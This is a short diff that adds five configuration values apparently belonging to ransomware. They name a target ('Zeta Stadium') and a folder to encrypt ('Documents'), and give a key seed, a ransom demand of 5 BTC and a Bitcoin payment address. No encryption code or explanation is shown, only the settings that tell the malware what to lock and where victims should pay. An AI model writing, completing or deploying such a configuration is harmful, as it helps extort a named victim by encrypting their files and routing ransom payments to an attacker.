@@ -1,0 +1,5 @@
+target = 'Zeta Stadium'
+encrypt_dir = 'Documents'
+key_seed = '6cf19dda90a1b08febff7de8a5462b11'
+request_amount = '5 BTC'
+btc_addr = '1GVL3NPtESgz73rcom1ipZdBitdn8ffnco'
